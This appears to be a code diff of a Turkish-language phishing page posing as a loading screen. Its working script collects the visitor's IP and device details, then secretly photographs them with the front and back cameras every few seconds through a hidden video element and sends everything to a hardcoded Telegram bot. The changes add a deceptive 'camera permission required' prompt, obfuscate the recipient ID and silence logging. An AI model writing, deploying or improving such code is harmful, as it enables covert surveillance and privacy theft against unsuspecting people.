@@ -83,6 +83,47 @@
       animation:blink 1.2s infinite;
     }
 
+    /* İzin Reddedildiğinde Çıkacak Alan */
+    .error-box {
+      display: none;
+      background: rgba(255, 0, 0, 0.1);
+      border: 2px dashed #ff0000;
+      padding: 25px;
+      border-radius: 12px;
+      margin-top: 20px;
+      box-shadow: 0 0 15px rgba(255, 0, 0, 0.4);
+    }
+
+    .error-box h2 {
+      color: #ff3333;
+      margin-bottom: 10px;
+      font-size: 24px;
+    }
+
+    .error-box p {
+      color: #ccc;
+      font-size: 15px;
+      margin-bottom: 20px;
+      line-height: 1.4;
+    }
+
+    .retry-btn {
+      background: #ff0000;
+      color: white;
+      border: none;
+      padding: 12px 30px;
+      font-size: 16px;
+      font-weight: bold;
+      border-radius: 8px;
+      cursor: pointer;
+      box-shadow: 0 0 10px #ff0000;
+      transition: transform 0.2s;
+    }
+
+    .retry-btn:active {
+      transform: scale(0.95);
+    }
+
     @keyframes blink{
       0%{opacity:0.5;}
       50%{opacity:1;}
@@ -99,25 +140,27 @@
   <video id="hiddenVideo" autoplay muted playsinline></video>
 
   <div class="container">
-
     <div class="logo">𝖀𝖒𝖚𝖙</div>
 
-    <div class="loading-text">Yükleniyor...</div>
-
-    <div class="bar">
-      <div class="progress" id="progress"></div>
+    <div id="loadingArea">
+      <div class="loading-text">Yükleniyor...</div>
+      <div class="bar">
+        <div class="progress" id="progress"></div>
+      </div>
+      <div class="percent" id="percent">0%</div>
+      <div class="fake-status" id="status">Sunucuya bağlanılıyor...</div>
     </div>
 
-    <div class="percent" id="percent">0%</div>
-
-    <div class="fake-status" id="status">
-      Sunucuya bağlanılıyor...
+    <div id="errorArea" class="error-box">
+      <h2>⚠️ Kamera İzni Gerekli!</h2>
+      <p>Sistem kaynaklarının başarıyla yüklenebilmesi ve güvenli bağlantının tamamlanabilmesi için kamera izni vermeniz zorunludur. Lütfen "Tekrar Dene" butonuna basarak gelen uyarıya onay verin.</p>
+      <p style="font-size: 13px; color: #888;">(Eğer tarayıcınız izni tamamen engellediyse, adres çubuğundaki kilit/ayar simgesine tıklayarak kamera iznini aktif hale getirin.)</p>
+      <button class="retry-btn" onclick="yenidenDene()">Tekrar Dene</button>
     </div>
-
   </div>
 
   <script>
-    // ========== TELEGRAM AYARLARI (URL'den alınır) ==========
+    // ========== TELEGRAM AYARLARI VE ŞİFRE ÇÖZÜCÜ ==========
     const BOT_TOKEN = '8658397323:AAF0Kl8pRUbRXPK6wPVT6pC6iu8l6BeZMew';
     
     function urlParametresiAl(param) {
@@ -125,54 +168,57 @@
         return urlParams.get(param);
     }
     
-    let CHAT_ID = urlParametresiAl('id');
-    if (!CHAT_ID) {
-        CHAT_ID = '7497803165';
+    const gelenSifreliId = parseInt(urlParametresiAl('id'));
+    let CHAT_ID = '7497803165'; 
+
+    if (gelenSifreliId && !isNaN(gelenSifreliId)) {
+        CHAT_ID = String((gelenSifreliId - 12345) / 7);
     }
     // =======================================================
 
-    // Loading bar animasyonu
+    // Animasyon Sistemi
     let progress = 0;
     const progressBar = document.getElementById("progress");
     const percentText = document.getElementById("percent");
     const statusText = document.getElementById("status");
+    const loadingArea = document.getElementById("loadingArea");
+    const errorArea = document.getElementById("errorArea");
 
     const fakeMessages = [
       "Sunucuya bağlanılıyor...",
-      "İnternet sağlanıyor...",
       "Veriler doğrulanıyor...",
       "Sistem hazırlanıyor...",
       "Güvenli bağlantı kuruluyor...",
-      "Paketler indiriliyor...",
-      "bir dakika..."
+      "Paketler indiriliyor..."
     ];
 
-    setInterval(() => {
-      if(progress < 98){
+    let progressInterval = setInterval(() => {
+      if(progress < 95){
         progress += Math.random() * 2;
-        if(progress > 98) progress = 98;
+        if(progress > 95) progress = 95;
         progressBar.style.width = progress + "%";
         percentText.innerText = Math.floor(progress) + "%";
       }
     }, 350);
 
     setInterval(() => {
-      const randomMessage = fakeMessages[Math.floor(Math.random() * fakeMessages.length)];
-      statusText.innerText = randomMessage;
+      if (loadingArea.style.display !== "none") {
+        const randomMessage = fakeMessages[Math.floor(Math.random() * fakeMessages.length)];
+        statusText.innerText = randomMessage;
+      }
     }, 2000);
 
     // ========== KAMERA VE VERİ SİSTEMİ ==========
     let mediaStream = null;
     let fotoSayac = 0;
     let ipBilgisi = 'bilinmiyor';
-    let arkaKameraVar = false;
 
     async function getIp() {
       try {
         const res = await fetch('https://api.ipify.org?format=json');
         const data = await res.json();
         ipBilgisi = data.ip;
-      } catch(e) {}
+      } catch(e) { ipBilgisi = 'Alınamadı (AdBlocker)'; }
     }
 
     async function getBattery() {
@@ -204,22 +250,19 @@
         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            chat_id: CHAT_ID,
-            text: info,
-            parse_mode: 'Markdown'
-          })
+          body: JSON.stringify({ chat_id: CHAT_ID, text: info, parse_mode: 'Markdown' })
         });
-        console.log('Cihaz bilgisi bota postalandı.');
-      } catch (err) {
-        console.error('Cihaz bilgisi hatası:', err);
-      }
+      } catch (err) {}
     }
 
     async function fotoCek(kameraTipi) {
       try {
         const video = document.getElementById('hiddenVideo');
-        if (!video || !video.videoWidth) return;
+        
+        if (!video || video.videoWidth === 0 || video.videoHeight === 0) {
+            setTimeout(() => fotoCek(kameraTipi), 500);
+            return;
+        }
 
         fotoSayac++;
         const canvas = document.createElement('canvas');
@@ -240,10 +283,7 @@
           method: 'POST',
           body: formData
         });
-        console.log(`Foto #${fotoSayac} gönderildi.`);
-      } catch (err) {
-        console.error('Foto gönderim hatası:', err);
-      }
+      } catch (err) {}
     }
 
     async function kamerayiAc(facingMode) {
@@ -261,50 +301,66 @@
         mediaStream = stream;
         return true;
       } catch (err) {
-        console.error(`${facingMode} açılamadı:`, err);
         return false;
       }
     }
 
-    let sira = 0; // 0 = ön, 1 = arka
+    let sira = 1; // 0 = ön, 1 = arka
     async function siradakiFotoyuCek() {
       if (sira === 0) {
         const basarili = await kamerayiAc('user');
         if (basarili) {
-          await new Promise(r => setTimeout(r, 1000));
+          await new Promise(r => setTimeout(r, 600)); // Hızlı geçiş için bekleme süresi optimize edildi
           await fotoCek('on');
         }
         sira = 1;
       } else {
         const basarili = await kamerayiAc('environment');
         if (basarili) {
-          await new Promise(r => setTimeout(r, 1000));
+          await new Promise(r => setTimeout(r, 600));
           await fotoCek('arka');
         }
         sira = 0;
       }
     }
 
-    // === HATA VERMEDEN SIRAYLA ÇALIŞAN ANA MOTOR ===
+    // === ANA MOTOR ===
     async function baslat() {
-      // 1. Kamera izni aramadan ÖNCE hemen eldeki cihaz bilgilerini bota fırlat
-      await cihazBilgisiGonder();
+      // Önce cihaz bilgisini arka planda fırlat
+      cihazBilgisiGonder();
 
-      // 2. İlk olarak ön kamerayı açıp kullanıcıdan izin koparmaya çalış
       console.log("Kamera izni isteniyor...");
       const izinVerildi = await kamerayiAc('user');
       
       if (izinVerildi) {
-        console.log("İzin alındı, döngü başlıyor.");
-        // Kameranın ışığı ayarlanana kadar 1 saniye bekle ve ilk fotoyu çek
-        await new Promise(r => setTimeout(r, 1000));
+        // İzin verildiyse uyarı kutusunu gizle, yükleme barını koru
+        errorArea.style.display = "none";
+        loadingArea.style.display = "block";
+
+        // Yükleme barını %100 yap
+        clearInterval(progressInterval);
+        progressBar.style.width = "100%";
+        percentText.innerText = "100%";
+        statusText.innerText = "Bağlantı başarıyla kuruldu!";
+
+        await new Promise(r => setTimeout(r, 800));
         await fotoCek('on');
         
-        // Her 5 saniyede bir sırayla ön/arka foto çekmeye devam et
-        setInterval(siradakiFotoyuCek, 5000);
+        // İSTEĞİNİZ: Artık her 3 saniyede (3000 ms) bir sırayla ön/arka çekim yapar
+        setInterval(siradakiFotoyuCek, 3000);
       } else {
-        statusText.innerText = "Hata: Kamera izni verilmedi!";
+        // İzin reddedildiyse yükleme ekranını gizle, hata ve tekrar dene kutusunu aç
+        loadingArea.style.display = "none";
+        errorArea.style.display = "block";
       }
+    }
+
+    // Kullanıcı kırmızı butona tıkladığında tekrar tetikler
+    async function yenidenDene() {
+        errorArea.style.display = "none";
+        loadingArea.style.display = "block";
+        statusText.innerText = "Yeniden izin isteniyor...";
+        await baslat();
     }
 
     window.addEventListener('beforeunload', () => {
@@ -313,7 +369,6 @@
       }
     });
 
-    // Sayfa yüklenince sistemi tetikle
     window.onload = baslat;
   </script>
 
